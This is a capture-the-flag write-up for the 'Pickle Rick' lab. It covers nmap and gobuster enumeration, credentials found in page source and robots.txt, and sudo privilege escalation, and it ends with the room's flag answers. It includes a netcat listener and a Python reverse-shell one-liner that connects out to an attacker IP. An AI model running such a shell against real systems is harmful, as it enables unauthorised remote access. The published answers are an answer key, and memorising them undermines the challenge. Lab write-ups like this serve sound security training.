# Pickle Rick

## Nmap

**nmap -A -sC 10.10.62.29**

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 18:13 CET
Nmap scan report for 10.10.62.29
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:64:30:d9:d1:81:45:21:b1:b2:33:fa:8a:f8:b3:4f (RSA)
|   256 6d:f5:08:88:52:1d:c4:b1:18:6d:3e:e2:b3:3e:8e:97 (ECDSA)
|_  256 bb:1f:32:48:65:51:03:c8:c3:08:45:ab:4a:52:f4:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
 ```


![image](https://github.com/prox11/CTF-Writeups/assets/148764185/5fffc11d-df88-4100-84dd-556791907873)


## Gobuster
**gobuster dir -u http://10.10.62.29 -w /usr/share/wordlists/dirb/big.txt -x php,txt**


```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/11/25 18:23:51 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess.txt        (Status: 403) [Size: 299]
/.htaccess.php        (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 299]
/.htpasswd.txt        (Status: 403) [Size: 299]
/assets               (Status: 301) [Size: 311] [--> http://10.10.62.29/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 299]
Progress: 61350 / 61410 (99.90%)
===============================================================
2023/11/25 18:29:49 Finished
===============================================================

 ```

## Source code and robots.txt

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/d5b849d6-e359-4242-8aa2-98b6429dda45)

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/ffd0a4f7-e55b-4874-9929-e504e6c498ea)

    Username: R1ckRul3s
    robots.txt: Wubbalubbadubdub

## Login page and shell

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/484714e7-d2c2-493a-ac48-c9d7ba136a9d)

      Username: R1ckRul3s
      Password: Wubbalubbadubdub

**nc -lvnp 4444**

**python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.146.46",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'**

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/1b42b811-490c-401d-b1c1-763d36a0b9b8)


![image](https://github.com/prox11/CTF-Writeups/assets/148764185/315629ac-bbad-418c-aac4-ef91ab108015)

## PrivEsc

**sudo -l**

```
sudo -l
Matching Defaults entries for www-data on
    ip-10-10-62-29.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-62-29.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

```
www-data@ip-10-10-62-29:/var/www/html$ sudo su
sudo su
root@ip-10-10-62-29:/var/www/html# whoami
whoami
root
root@ip-10-10-62-29:/var/www/html# 
```

<details>
    <summary>What is the first ingredient Rick needs?</summary>
  
    mr. meeseek hair
</details>

<details>
    <summary>Whats the second ingredient Rick needs?</summary>
  
    1 jerry tear
</details>

<details>
    <summary>Whats the final ingredient Rick needs?</summary>
    
    fleeb juice


</details>
